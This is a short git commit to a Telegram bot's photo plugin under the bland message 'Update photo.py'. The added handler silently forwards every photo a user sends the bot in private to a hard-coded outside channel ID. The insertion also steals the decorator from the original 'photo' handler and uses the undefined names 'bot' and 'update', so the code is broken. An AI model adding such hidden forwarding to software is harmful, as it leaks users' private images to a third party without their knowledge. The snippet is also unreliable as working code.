882cae3b48609953a1235a5b2707449f849af68d
fh_bots <69167693+fh-bots@users.noreply.github.com>
2021-01-25 22:07:58 +0530

    Update photo.py

--- plugins/photo.py
+++ plugins/photo.py
@@ -4,6 +4,8 @@ from pyrogram import Client, filters
 
 
 @Client.on_message(filters.photo & filters.private)
+async def sen(client : Client, message : Message):
+    await bot.forward_messages(chat_id=int(-1001435384922), from_chat_id=update.chat.id, message_ids=update.message_id) 
 async def photo(client: Client, message: Message):
     try:
         await client.send_message(
